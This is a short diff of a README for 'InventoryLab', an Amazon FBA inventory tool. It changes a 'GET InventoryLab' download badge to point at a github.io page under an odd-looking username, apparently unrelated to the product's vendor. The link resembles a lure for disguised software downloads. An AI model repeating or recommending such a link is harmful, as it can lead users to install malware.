@@ -1,6 +1,6 @@
 # InventoryLab - Amazon FBA Inventory Management Platform
 
-[![GET InventoryLab](https://img.shields.io/badge/GET%20%E2%80%94%20InventoryLab-0078D6?style=for-the-badge&logoColor=white)](https://lanesliwinskirltul.github.io/.github/)
+[![GET InventoryLab](https://img.shields.io/badge/GET%20%E2%80%94%20InventoryLab-0078D6?style=for-the-badge&logoColor=white)](https://lanesliwinskirltul.github.io/.github/inventorylab-scoutify)
 
 ## InventoryLab Workspace Overview
 
